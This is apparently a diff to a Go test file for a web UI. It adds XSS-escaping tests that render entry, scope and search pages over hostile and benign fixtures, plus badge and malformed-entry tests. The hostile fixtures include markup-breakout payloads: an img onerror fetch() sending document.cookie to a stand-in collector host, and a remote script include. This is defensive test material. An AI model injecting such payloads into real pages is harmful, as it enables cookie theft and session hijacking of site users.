@@ -3,6 +3,11 @@ package ui
 import (
 	"strings"
 	"testing"
+
+	g "maragu.dev/gomponents"
+
+	"github.com/ZacxDev/cairn/internal/report"
+	"github.com/ZacxDev/cairn/internal/store"
 )
 
 // 🔴 THE HOSTILE FIXTURES ARE REALISTIC, NOT TEXTBOOK, AND THAT IS THE POINT RATHER
@@ -108,34 +113,66 @@ func structureOf(s string) structure {
 	}
 }
 
+// A hostile SECTION HEADING and a hostile BULLET. Both are new surfaces: until the
+// entry page existed, an entry's BODY never reached a browser at all — only its ref,
+// title, aliases and task refs did.
+//
+// 🔴 THE BULLET IS THE WIDEST USER-TEXT SINK ON THE SURFACE AND ITS PAYLOAD IS CHOSEN
+// FOR THE POSITION IT LANDS IN. It renders inside a `<pre><code>` as text content AND
+// its first line decides a badge, so the fixture carries a markup breakout and a
+// near-miss marker in the same line: a renderer that keyed the badge on a substring
+// rather than on `store.OpennessPopulation` would light the OPEN badge for it.
+const (
+	hostileHeading = `## Pointers</h3><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)"><h3>`
+	hostileBullet  = `- OPENISH: </code></pre><img src=x onerror="fetch('//collector.invalid/c')"> see the runbook`
+	hostileBody    = `prose</code></pre><script src="//collector.invalid/x.js"></script><pre><code>`
+)
+
 // benignWorld mirrors [hostileWorld] SHAPE FOR SHAPE: one scope, one entry, one
 // alias, four task refs of which exactly three are refused by [safeHref] and one is
-// a link. A benign world of a different shape would produce different counts for a
-// reason that has nothing to do with escaping, and the comparison would be noise.
+// a link, two sections, one bullet and one malformed row. A benign world of a different
+// shape would produce different counts for a reason that has nothing to do with
+// escaping, and the comparison would be noise.
 func benignWorld() []Scope {
 	return []Scope{{
+		ID:   fixtureScope,
 		Name: "platform",
 		Entries: []Entry{{
-			Ref:     "runbook",
-			Title:   "Rollout notes",
-			Aliases: []string{"rollout"},
+			Ref:      "runbook",
+			Title:    "Rollout notes",
+			Filename: "runbook.md",
+			Aliases:  []string{"rollout"},
 			Tasks: []string{
 				"jira:PLAT-1",
 				"jira:PLAT-2",
 				"jira:PLAT-3",
 				"https://tracker.invalid/issue/4711",
 			},
+			Sections: []Section{
+				{Heading: "## Pointers", Body: "prose"},
+				{Heading: store.NuanceHeading, Body: "- a bullet", Bullets: []Bullet{
+					{Lines: []string{"- a bullet"}, Date: "2000-06-01", Population: store.PopulationNone},
+				}},
+			},
+			BulletCount: 1,
 		}},
+		Malformed: []Malformed{{Label: "platform/broken.md", Reason: "missing `service:`"}},
 	}}
 }
 
 func hostileWorld() []Scope {
 	return []Scope{{
+		// The ID is NOT hostile: it is minted by `control.DerivedID` over a URL-safe
+		// alphabet and can never be anything else, so a hostile one would be testing a
+		// value the type cannot hold. Same id as the benign world so the two pages carry
+		// the same links and the structural differential stays about content.
+		ID:   fixtureScope,
 		Name: hostileScope,
 		Entries: []Entry{{
-			Ref:     hostileRef,
-			Title:   hostileTitle,
-			Aliases: []string{hostileAlias},
+			Ref:      hostileRef,
+			Title:    hostileTitle,
+			Filename: hostileRef + ".md",
+			Aliases:  []string{hostileAlias},
 			Tasks: []string{
 				hostileTaskScript,
 				hostileTaskMixedCase,
@@ -145,7 +182,19 @@ func hostileWorld() []Scope {
 				// assertion by never emitting an href at all.
 				"https://tracker.invalid/issue/4711",
 			},
+			Sections: []Section{
+				{Heading: hostileHeading, Body: hostileBody},
+				{Heading: store.NuanceHeading, Body: hostileBullet, Bullets: []Bullet{
+					// 🔴 `PopulationNone`, WITH AN `OPENISH:` FIRST LINE. The badge is
+					// derived from this field and never from the text, so a renderer
+					// that read the words would light the OPEN badge here and the
+					// structural differential below would see the extra element.
+					{Lines: []string{hostileBullet}, Date: "2000-06-01", Population: store.PopulationNone},
+				}},
+			},
+			BulletCount: 1,
 		}},
+		Malformed: []Malformed{{Label: hostileRef + "/broken.md", Reason: hostileBody}},
 	}}
 }
 
@@ -158,13 +207,256 @@ func hostileWorld() []Scope {
 // assertions rather than leaving a new markup sink outside them.
 const renderCSRF = "a-fixed-fixture-csrf-token"
 
+func viewOf(viewer string, scopes []Scope) PageView {
+	return PageView{Viewer: viewer, CSRF: renderCSRF, Scopes: scopes}
+}
+
 func render(t *testing.T, viewer string, scopes []Scope) string {
 	t.Helper()
+	return renderNode(t, Page(viewOf(viewer, scopes)))
+}
+
+func renderNode(t *testing.T, node g.Node) string {
+	t.Helper()
 	var b strings.Builder
-	if err := Page(viewer, scopes, renderCSRF).Render(&b); err != nil {
+	if err := node.Render(&b); err != nil {
 		t.Fatalf("the page did not render: %v", err)
 	}
 	return b.String()
+}
+
+// renderedPages is the SAME page, rendered over two worlds of identical shape, for each
+// of the three browse pages.
+//
+// 🔴 ALL THREE, BECAUSE THE DIFFERENTIAL IS PER PAGE AND THE ENTRY PAGE IS THE ONE THAT
+// MATTERS. The root page shows no entry body at all; the scope page shows refs and
+// titles; only the entry page renders sections and bullets, which is the surface this
+// change ADDED and the only one where a store file's prose reaches the browser. A guard
+// that ran over the root alone would be green for a broken entry page.
+func renderedPages(t *testing.T, world []Scope) map[string]string {
+	t.Helper()
+	v := viewOf("operator@example.invalid", world)
+	scopeView := v
+	scopeView.Scope = &world[0]
+	entryView := scopeView
+	entryView.Entry = &world[0].Entries[0]
+	searchView := v
+	searchView.Query = world[0].Entries[0].Ref
+	searchView.Results = &SearchResults{
+		Query:          world[0].Entries[0].Ref,
+		TotalHits:      1,
+		ScopesSearched: []string{world[0].Name},
+		Hits: []Hit{{
+			ScopeID: world[0].ID,
+			Scope:   world[0].Name,
+			Ref:     world[0].Entries[0].Ref,
+			Section: world[0].Entries[0].Sections[0].Heading,
+			Start:   1,
+			Lines:   world[0].Entries[0].Sections[1].Bullets[0].Lines,
+			Score:   1,
+			Basis:   report.BasisLine,
+		}},
+	}
+	return map[string]string{
+		"root":     renderNode(t, Page(v)),
+		"navigate": renderNode(t, NavigatePage(v)),
+		"scope":    renderNode(t, ScopePage(scopeView)),
+		"entry":    renderNode(t, EntryPage(entryView)),
+		"search":   renderNode(t, Page(searchView)),
+	}
+}
+
+// TestHostileEntryTextIsEscapedOnEveryBrowsePage is the XSS guard over the pages this
+// change added, and it is the SAME differential `TestHostileEntryTextIsEscaped` runs over
+// the root — applied per page, because each renders a different subset of the store.
+func TestHostileEntryTextIsEscapedOnEveryBrowsePage(t *testing.T) {
+	// POSITIVE CONTROL — the new fixtures really do carry markup the counters can see.
+	// Reported as a pair with the zeroes below, never on their own.
+	newlyReachable := hostileHeading + hostileBullet + hostileBody
+	if n := countTokens(newlyReachable); n == 0 {
+		t.Fatal("POSITIVE CONTROL FAILED: the heading/bullet/body fixtures carry NOTHING the token scanner " +
+			"recognises, so a zero on the rendered entry page below would mean nothing")
+	}
+	benignSectionContent := "## Pointers" + "prose" + "- a bullet"
+	if structureOf(benignSectionContent) == structureOf(newlyReachable) {
+		t.Fatalf("POSITIVE CONTROL FAILED: the hostile section fixtures carry the same markup shape as the "+
+			"benign ones (%+v), so the differential below cannot detect an injection into a section or a "+
+			"bullet and its agreement would mean nothing", structureOf(newlyReachable))
+	}
+
+	hostile := renderedPages(t, hostileWorld())
+	benign := renderedPages(t, benignWorld())
+	if len(hostile) != len(benign) || len(hostile) == 0 {
+		t.Fatalf("the two renders produced %d and %d pages; the comparison below needs the same set",
+			len(hostile), len(benign))
+	}
+
+	checked := 0
+	for name, got := range hostile {
+		want := benign[name]
+		if want == "" {
+			t.Fatalf("no benign render for page %q, so its comparison is vacuous", name)
+		}
+		checked++
+		if gotStructure, wantStructure := structureOf(got), structureOf(want); gotStructure != wantStructure {
+			t.Errorf("the %s page's MARKUP SHAPE differs between the hostile and benign worlds: got %+v, "+
+				"want %+v.\nThe two worlds have the same number of scopes, entries, aliases, refs, sections, "+
+				"bullets and malformed rows, so every difference here is user text that became markup. "+
+				"gomponents escapes text and attribute VALUES; it does not neutralise a URL scheme and it "+
+				"writes an element or attribute NAME verbatim.", name, gotStructure, wantStructure)
+		}
+		for _, tok := range dangerousTokens {
+			if n := strings.Count(strings.ToLower(got), strings.ToLower(tok)); n > 0 {
+				t.Errorf("the %s page carries %d occurrence(s) of %q, which this renderer never emits: "+
+					"it came out of store content.", name, n, tok)
+			}
+		}
+	}
+	if checked == 0 {
+		t.Fatal("NO page was compared, so this test measured nothing")
+	}
+
+	// 🔴 AND THE WHOLE ESCAPED STRING, PINNED, FOR EACH OF THE THREE NEW SINKS. A guard
+	// on the ABSENCE of a token passes for a page that dropped the content entirely; this
+	// is what says the text is present AND inert. The literals are hand-written from the
+	// HTML escaping rules rather than derived from the function under test.
+	entry := hostile["entry"]
+	for _, want := range []string{
+		escapeForTest(hostileHeading),
+		escapeForTest(hostileBullet),
+		escapeForTest(hostileBody),
+	} {
+		if !strings.Contains(entry, want) {
+			t.Errorf("the entry page does not carry the fully escaped form of a hostile string; it was "+
+				"DROPPED rather than rendered inert.\nwanted substring: %s", want)
+		}
+	}
+	t.Logf("escaping: %d page(s) compared structurally over hostile vs benign worlds; %d dangerous token(s) "+
+		"in the new section/bullet fixtures, 0 in any rendered page", checked, countTokens(newlyReachable))
+}
+
+// TestTheBadgeComesFromThePopulationAndNotFromTheWords is the REGRESSION test for the
+// distinction `store.JournalBullet.OpennessPopulation` exists to make.
+//
+// 🔴 A NEAR MISS IS A BULLET THAT TRIED TO WRITE A MARKER AND MISSED THE GRAMMAR, AND IT
+// MUST NOT SHOW THE OPEN BADGE. `report.RecalledEntry.NearMissCount`'s own comment records
+// that until near misses were counted separately they were byte-identical to "no marker"
+// on the read surface — the badge simply did not render, and a vanishing badge looks like
+// success. So this pins both directions: the open badge appears for `PopulationOpen` and
+// for nothing else, and a near miss gets its OWN badge rather than silence.
+//
+// ⚠ IT DRIVES THE PARSER RATHER THAN HAND-BUILDING THE POPULATIONS, so it also measures
+// that the near-miss fixture really IS a near miss to `store` — a hand-set
+// `Population: PopulationNearMiss` would assert the renderer against a value this test
+// invented.
+func TestTheBadgeComesFromThePopulationAndNotFromTheWords(t *testing.T) {
+	body := strings.Join([]string{
+		"- OPEN: the declared one",
+		"- OPEN the near miss, no colon",
+		"- an ordinary bullet",
+	}, "\n")
+	parsed := store.ParseJournalBullets(body)
+	if len(parsed) != 3 {
+		t.Fatalf("the fixture parsed to %d bullets, want 3; the assertions below would be about the wrong lines", len(parsed))
+	}
+
+	// INSTRUMENT CONTROL: the three lines really are in three different populations, so
+	// the render comparison below is about the renderer and not about a fixture whose
+	// lines all mean the same thing.
+	wantPopulations := []string{store.PopulationOpen, store.PopulationNearMiss, store.PopulationNone}
+	var section Section
+	section.Heading = store.NuanceHeading
+	section.Body = body
+	for i, b := range parsed {
+		if got := b.OpennessPopulation(); got != wantPopulations[i] {
+			t.Fatalf("bullet %d parsed as population %q, want %q. The fixture is not exercising the "+
+				"distinction this test is named for.", i, got, wantPopulations[i])
+		}
+		section.Bullets = append(section.Bullets, Bullet{Lines: b.Lines, Date: b.Date, Population: b.OpennessPopulation()})
+	}
+
+	world := benignWorld()
+	world[0].Entries[0].Sections = []Section{section}
+	view := viewOf("operator@example.invalid", world)
+	view.Scope = &world[0]
+	view.Entry = &world[0].Entries[0]
+	out := renderNode(t, EntryPage(view))
+
+	openBadges := strings.Count(out, `<span class="badge badge-open">OPEN</span>`)
+	nearBadges := strings.Count(out, `<span class="badge badge-near">near-miss marker</span>`)
+	if openBadges != 1 {
+		t.Errorf("the entry page rendered %d OPEN badge(s) over a section with exactly ONE declared `OPEN:` "+
+			"bullet, one near miss and one plain line. A renderer keyed on the WORD would light two.", openBadges)
+	}
+	if nearBadges != 1 {
+		t.Errorf("the entry page rendered %d near-miss badge(s), want 1. A near miss rendered as nothing is "+
+			"byte-identical to a bullet with no marker, which is the state that hides a stale open action.",
+			nearBadges)
+	}
+	// The near-miss line's own text must still be on the page: the badge is the claim, the
+	// line is the evidence, and a page that showed one without the other is unreadable.
+	if !strings.Contains(out, escapeForTest("OPEN the near miss, no colon")) {
+		t.Error("the near-miss bullet's text is not on the page, so its badge names a line nobody can read")
+	}
+	t.Logf("badges: %d open, %d near-miss over populations %v", openBadges, nearBadges, wantPopulations)
+}
+
+// TestAMalformedEntryRendersAsMalformed pins that a file the loader REFUSED is on the
+// page rather than absent.
+//
+// 🔴 A BROWSER THAT DROPS THEM DISAGREES WITH THE CLI WHILE LOOKING COMPLETE, which is
+// why this is a regression test and not a nicety. `store.LoadStore` loads with `Collect`
+// because failing closed cost a whole scope over one bad file, and `internal/report`
+// renders every collected row; a page that showed only the good entries would be a
+// shorter, WRONG store with no symptom.
+func TestAMalformedEntryRendersAsMalformed(t *testing.T) {
+	world := benignWorld()
+	if len(world[0].Malformed) == 0 {
+		t.Fatal("the benign fixture carries no malformed row, so this test would pass vacuously")
+	}
+	row := world[0].Malformed[0]
+
+	view := viewOf("operator@example.invalid", world)
+	view.Scope = &world[0]
+	out := renderNode(t, ScopePage(view))
+
+	if !strings.Contains(out, escapeForTest(row.Label)) {
+		t.Errorf("the scope page does not name the malformed file %q. A page that drops it shows a complete-"+
+			"looking scope that is missing entries.", row.Label)
+	}
+	if !strings.Contains(out, escapeForTest(row.Reason)) {
+		t.Errorf("the scope page names %q without the loader's reason, so a reader cannot tell a broken file "+
+			"from one they are not allowed to see", row.Label)
+	}
+
+	// NEGATIVE CONTROL: a scope with no malformed rows renders no block, so the assertion
+	// above is about the rows and not about a heading that is always there.
+	clean := benignWorld()
+	clean[0].Malformed = nil
+	cleanView := viewOf("operator@example.invalid", clean)
+	cleanView.Scope = &clean[0]
+	if cleanOut := renderNode(t, ScopePage(cleanView)); strings.Contains(cleanOut, "Unreadable entry files") {
+		t.Error("a scope with NO malformed rows still rendered the unreadable-files block, so its presence " +
+			"above says nothing about whether the rows reached the page")
+	}
+	t.Logf("malformed: %q rendered with its reason; a clean scope renders no block", row.Label)
+}
+
+// renderScopeOf is the SCOPE page over a one-scope world — the page that renders an
+// entry's ref, title, aliases and task refs.
+//
+// ⚠ IT WAS THE ROOT PAGE AND IT MOVED, WHICH IS A CONSEQUENCE OF THE INFORMATION
+// ARCHITECTURE RATHER THAN A WEAKENING. The root used to render every entry of every
+// scope inline; it now renders a CARD per scope, listing refs and no titles, aliases or
+// task refs at all. The assertions below are about those four fields, so they follow them
+// to the page that shows them. The root's own escaping is not left unmeasured —
+// `TestHostileEntryTextIsEscapedOnEveryBrowsePage` runs the structural differential over
+// all five renders including the root.
+func renderScopeOf(t *testing.T, viewer string, scopes []Scope) string {
+	t.Helper()
+	v := viewOf(viewer, scopes)
+	v.Scope = &scopes[0]
+	return renderNode(t, ScopePage(v))
 }
 
 // TestHostileEntryTextIsEscaped is the XSS guard.
@@ -191,8 +483,8 @@ func TestHostileEntryTextIsEscaped(t *testing.T) {
 			structureOf(benignContent))
 	}
 
-	out := render(t, "operator@example.invalid", hostileWorld())
-	benignOut := render(t, "operator@example.invalid", benignWorld())
+	out := renderScopeOf(t, "operator@example.invalid", hostileWorld())
+	benignOut := renderScopeOf(t, "operator@example.invalid", benignWorld())
 
 	// 🔴 THE DIFFERENTIAL. Same shape, different content, identical markup structure.
 	gotStructure, wantStructure := structureOf(out), structureOf(benignOut)
